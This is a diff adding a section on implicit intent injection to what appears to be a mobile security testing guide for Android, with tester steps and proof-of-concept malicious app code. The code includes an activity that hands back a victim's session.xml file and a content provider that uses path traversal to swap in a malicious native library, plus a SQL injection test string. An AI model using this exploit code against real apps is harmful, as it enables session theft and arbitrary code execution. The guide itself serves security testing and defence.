@@ -407,7 +407,150 @@ public boolean isAlphaNumeric(String s){
 
 An alternative to validation functions is type conversion, with, for example, `Integer.parseInt` if only integers are expected. The [OWASP Input Validation Cheat Sheet](https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet "OWASP Input Validation Cheat Sheet") contains more information about this topic.
 
+#### Implicit Intent Injection
+
+[Implicit intents](https://developer.android.com/guide/components/intents-filters#ExampleSend) are useful when the user want to use an external functionality of another app without requiring the developer to specify a particular app in the intent. For example, if the user clicks on an e-mail address within an app, an e-mail app should open and prepare a draft to the given e-mail address. However, the calling app does not want to specify a concrete e-mail app but leaves this choice to the user.
+This can always lead to a security risk if the calling app processes the return value of the implicit intent without verifying it. A blog post by [oversecured](https://blog.oversecured.com/Interception-of-Android-implicit-intents/), describes the mentioned problem with concrete attack scenarios.
+<br>Explicit Intent
+
+```java
+// Note the specification of a concrete component (DownloadActivity) that is started by the intent.
+Intent downloadIntent = new Intent(this, DownloadActivity.class);
+downloadIntent.setAction("android.intent.action.GET_CONTENT")
+startActivityForResult(downloadIntent);
+```
+
+Implicit Intent
+
+```java
+// Developers can also start an activity by just setting an action that is matched by the intended app.
+Intent downloadIntent = new Intent();
+downloadIntent.setAction("android.intent.action.GET_CONTENT")
+startActivityForResult(downloadIntent);
+```
+
+### Static Analysis
+
+#### Testing Implicit Intent Injection
+
+The Manifest contains [queries](https://developer.android.com/guide/topics/manifest/queries-element) that specify the set of other apps an app intends to interact with. Within the `<queries>` block an app can specify an intent signature with `<intent>`. A tester should check if it contains `android.intent.action.GET_CONTENT`, `android.intent.action.PICK`, `android.media.action.IMAGE_CAPTURE` and browse the code for their occurrence.
+Next, a tester should check if an implicit intent is being used for the actions mentioned previously which is then started by `startActivityForResult()`.
+
+```java
+Intent intent = new Intent();
+      intent.setAction("android.intent.action.GET_CONTENT");
+      startActivityForResult(Intent.createChooser(intent, ""), REQUEST_IMAGE);
+```
+
+Subsequently, the tester should check how the return value of this intent is handled by searching for the `onActivityResult()` method. If the return value of the intent isn't properly checked an attacker can read arbitrary files from within the app's internal storage *(/data/data/\<appname>)*.
+The `performAction()` method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to `getFileItemFromUir()`. This method copies the file to a temp folder, which is usual if this file is displayed internally. But if the app stores the URI provided file in an external temp directory e.g by calling `getExternalCacheDir` or `getExternalFilesDir` an attacker can read this file if he sets the permission `android.permission.READ_EXTERNAL_STORAGE`.
+
+```java
+private void performAction(Action action){
+  ...
+  Uri data = intent.getData();
+  if (!(data == null || (fileItemFromUri = getFileItemFromUri(data)) == null)) {
+      ...
+  }
+}
+
+private FileItem getFileItemFromUri(Context, context, Uri uri){
+  String fileName = UriExtensions.getFileName(uri, context);
+  File file = new File(getExternalCacheDir(), "tmp");
+  file.createNewFile();
+  copy(context.openInputStream(uri), new FileOutputStream(file));
+  ...
+}
+```
+
+The following is the source of a malicious app that exploits the above vulnerable code.
+<br>AndroidManifest.xml
+
+```xml
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+<application>
+  <activity android:name=".EvilContentActivity">
+      <intent-filter android:priority="999">
+          <action android:name="android.intent.action.GET_CONTENT" />
+          <data android:mimeType="*/*" />
+      </intent-filter>
+  </activity>
+</application>
+```
+
+EvilContentActivity.java
+
+```java
+public class EvilContentActivity extends Activity{
+  @Override
+  protected void OnCreate(@Nullable Bundle savedInstanceState){
+    super.OnCreate(savedInstanceState);
+    setResult(-1, new Intent().setData(Uri.parse("file:///data/data/<victim_app>/shared_preferences/session.xml")));
+    finish();
+  }
+}
+```
+
+If the user selects the malicious app to handle his intent, the attacker can now steal the session.xml file from the app's internal storage. In the previous example, the victim must explicitly select the attacker's malicious app in a dialog. However, it could be that the developers suppress this selection dialog and automatically determine a recipient for the intent. This would enable the attack without additional user interaction.
+The following code sample implements this automatic selection of the recipient. By specifying a priority in the malicious app's intent filter, the attacker can influence the selection sequence.
+
+```java
+Intent intent = new Intent("android.intent.action.GET_CONTENT");
+for(ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) {
+    intent.setClassName(info.activityInfo.packageName, info.activityInfo.name);
+    startActivityForResult(intent);
+    return;
+}
+```
+
+Furthermore, an improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows `content://` url's in addition to `file://` url's.
+An attacker implements a [ContentProvider](https://developer.android.com/reference/android/content/ContentProvider) that contains `public Cursor query(...)` to set an arbitrary file (in this case *lib.so*, and if the victim loads this file from the content provider by executing `copy()` the attackers `ParcelFileDescriptor openFile(...)` method is being executed and returns a malicious *fakelib.so*.
+<br>AndroidManifest.xml
+
+```xml
+<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+<application>
+  <activity android:name=".EvilContentActivity">
+      <intent-filter android:priority="999">
+          <action android:name="android.intent.action.GET_CONTENT" />
+          <data android:mimeType="*/*" />
+      </intent-filter>
+  </activity>
+  <provider android:name=".EvilContentProvider" android:authorities="com.attacker.evil" android:enabled="true" android:exported="true"></provider>
+</application>
+```
+
+EvilContentProvider.java
+
+```java
+public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
+    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
+    matrixCursor.addRow(new Object[]{"../lib-main/lib.so"});
+    return matrixCursor;
+}
+public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
+    return ParcelFileDescriptor.open(new File("/data/data/com.attacker/fakelib.so"), ParcelFileDescriptor.MODE_READ_ONLY);
+}
+```
+
+EvilContentActivity.java
+
+```java
+public class EvilContentActivity extends Activity{
+  @Override
+  protected void OnCreate(@Nullable Bundle savedInstanceState){
+    super.OnCreate(savedInstanceState);
+    setResult(-1, new Intent().setData(Uri.parse("content:///data/data/com.attacker/fakelib.so")));
+    finish();
+  }
+}
+```
+
+A full description of the attack is included in the [blog article by oversecured](https://blog.oversecured.com/Interception-of-Android-implicit-intents)
+
 ### Dynamic Analysis
+
+#### Testing Content Provider Injection
 
 The tester should manually test the input fields with strings like `OR 1=1--` if, for example, a local SQL injection vulnerability has been identified.
 
